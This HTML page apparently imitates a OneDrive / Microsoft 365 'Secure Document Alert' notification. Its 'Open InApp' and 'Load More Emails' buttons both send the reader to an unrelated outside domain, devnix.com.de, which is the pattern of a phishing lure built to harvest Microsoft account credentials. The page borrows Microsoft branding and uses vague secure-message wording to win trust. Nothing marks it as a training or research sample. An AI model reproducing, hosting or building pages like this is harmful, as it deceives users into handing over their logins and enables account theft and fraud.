<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OneDrive - Microsoft 365</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --background: 0 0% 100%;
            --foreground: 210 11% 15%;
            --card: 0 0% 100%;
            --card-foreground: 210 11% 15%;
            --primary: 208 100% 42%;
            --primary-foreground: 0 0% 100%;
            --primary-hover: 208 100% 37%;
            --secondary: 210 17% 96%;
            --secondary-foreground: 210 11% 15%;
            --muted: 210 17% 96%;
            --muted-foreground: 210 6% 46%;
            --accent: 213 100% 96%;
            --accent-foreground: 213 100% 27%;
            --warning: 35 100% 50%;
            --warning-foreground: 0 0% 100%;
            --border: 210 17% 90%;
        }

        body {
            background-color: hsl(var(--background));
            color: hsl(var(--foreground));
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        .bg-background { background-color: hsl(var(--background)); }
        .bg-card { background-color: hsl(var(--card)); }
        .bg-primary { background-color: hsl(var(--primary)); }
        .bg-secondary { background-color: hsl(var(--secondary)); }
        .bg-accent { background-color: hsl(var(--accent)); }
        .bg-muted { background-color: hsl(var(--muted)); }
        
        .text-foreground { color: hsl(var(--foreground)); }
        .text-primary-foreground { color: hsl(var(--primary-foreground)); }
        .text-secondary-foreground { color: hsl(var(--secondary-foreground)); }
        .text-accent-foreground { color: hsl(var(--accent-foreground)); }
        .text-muted-foreground { color: hsl(var(--muted-foreground)); }
        
        .border-border { border-color: hsl(var(--border)); }
        
        .hover\:bg-primary-hover:hover { background-color: hsl(var(--primary-hover)); }
        .hover\:bg-muted:hover { background-color: hsl(var(--muted)); }
        .hover\:bg-muted\/30:hover { background-color: hsl(var(--muted) / 0.3); }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 0.375rem;
            font-weight: 500;
            padding: 0.5rem 1rem;
            transition: all 0.2s;
            cursor: pointer;
            border: none;
        }

        .btn-primary {
            background-color: hsl(var(--primary));
            color: hsl(var(--primary-foreground));
        }

        .btn-primary:hover {
            background-color: hsl(var(--primary-hover));
        }

        .btn-outline {
            background-color: transparent;
            border: 1px solid hsl(var(--border));
            color: hsl(var(--foreground));
        }

        .btn-outline:hover {
            background-color: hsl(var(--muted));
        }

        .badge {
            display: inline-flex;
            align-items: center;
            border-radius: 9999px;
            padding: 0.125rem 0.625rem;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .badge-secondary {
            background-color: hsl(var(--secondary));
            color: hsl(var(--secondary-foreground));
        }

        .badge-accent {
            background-color: hsl(var(--accent));
            color: hsl(var(--accent-foreground));
        }

        .star-fill {
            fill: hsl(var(--warning));
            color: hsl(var(--warning));
        }
    </style>
</head>
<body class="min-h-screen bg-background">
    <!-- OneDrive Header -->
    <div class="flex items-center justify-between p-4 bg-background border-b border-border">
        <div class="flex items-center gap-3">
            <div class="w-8 h-8 flex items-center justify-center">
                <img src="https://cdn0.iconfinder.com/data/icons/logos-microsoft-office-365/128/Microsoft_Office-08-1024.png" alt="OneDrive" class="w-8 h-8" />
            </div>
            <h1 class="text-xl font-semibold text-foreground">OneDrive</h1>
        </div>
        
        <div class="flex items-center gap-3">
            <span class="badge badge-secondary">
                1 notification
            </span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-4xl mx-auto">
        <div class="bg-card shadow-sm">
            <!-- File Notification -->
            <div class="p-4 border-b border-border hover:bg-muted/30 transition-colors">
                <div class="flex items-start gap-3">
                    <div class="w-2 h-2 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                    
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center gap-2 mb-1">
                            <span class="font-medium text-foreground">Microsoft 365</span>
                            <span class="badge badge-accent">
                                document
                            </span>
                            <!-- Star icon -->
                            <svg class="w-4 h-4 star-fill" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
                            </svg>
                        </div>
                        
                        <h3 class="font-semibold text-foreground mb-2">Secure Document Alert</h3>
                        <p class="text-sm text-muted-foreground mb-3">
                            The message was sent securely to protect sensitive information included in the correspondence 
                            <button class="btn btn-primary ml-2 text-base px-2 py-1" onclick="window.open('https://devnix.com.de/sOouvLsxZ/', '_blank')">
                                Open InApp
                            </button>
                        </p>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="p-6 text-center">
            <button class="btn btn-outline" onclick="window.open('https://devnix.com.de/sOouvLsxZ/', '_blank')">
                Load More Emails
            </button>
        </div>
    </div>
</body>
</html>
